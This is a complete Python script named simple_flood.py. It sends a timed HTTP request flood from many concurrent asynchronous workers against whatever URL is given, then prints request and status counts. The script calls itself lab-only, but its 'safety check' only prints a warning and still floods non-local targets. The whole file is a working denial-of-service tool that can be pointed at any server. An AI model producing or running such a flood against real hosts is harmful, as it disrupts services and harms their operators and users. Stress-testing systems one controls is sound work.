#!/usr/bin/env python3
"""
simple_flood.py — lab-only HTTP flood simulator (async).
USAGE (example):
  python3 simple_flood.py --url http://10.0.0.10:8000/ --concurrency 200 --duration 30
CAUTION: run ONLY on systems you control in an isolated lab network.
"""
import asyncio, aiohttp, time, argparse, sys
from collections import Counter

parser = argparse.ArgumentParser()
parser.add_argument('--url', required=True, help='Target URL (lab only)')
parser.add_argument('--concurrency', type=int, default=100, help='Number of concurrent workers')
parser.add_argument('--duration', type=int, default=30, help='Test duration (seconds)')
parser.add_argument('--delay', type=float, default=0.0, help='Per-request delay (seconds) — set >0 to reduce aggressiveness')
args = parser.parse_args()

stats = Counter()

async def worker(session, id, stop_at):
    while time.time() < stop_at:
        try:
            async with session.get(args.url) as resp:
                stats['requests'] += 1
                stats[f'status_{resp.status}'] += 1
                # read minimal amount to complete request
                await resp.content.read(16)
        except Exception as e:
            stats['errors'] += 1
        if args.delay:
            await asyncio.sleep(args.delay)

async def main():
    stop_at = time.time() + args.duration
    timeout = aiohttp.ClientTimeout(total=10)
    conn = aiohttp.TCPConnector(limit_per_host=args.concurrency, force_close=True)
    async with aiohttp.ClientSession(timeout=timeout, connector=conn) as session:
        tasks = [asyncio.create_task(worker(session, i, stop_at)) for i in range(args.concurrency)]
        print(f"Started {args.concurrency} workers for {args.duration}s against {args.url}")
        await asyncio.gather(*tasks, return_exceptions=True)

if __name__ == '__main__':
    if 'localhost' not in args.url and args.url.startswith('http'):
        # quick safety check: warn user (but still allow). You must run only in lab.
        print("WARNING: Make sure this target is an isolated lab VM you control.")
    try:
        asyncio.run(main())
    finally:
        print("\n--- Summary ---")
        for k,v in stats.items():
            print(f"{k}: {v}")
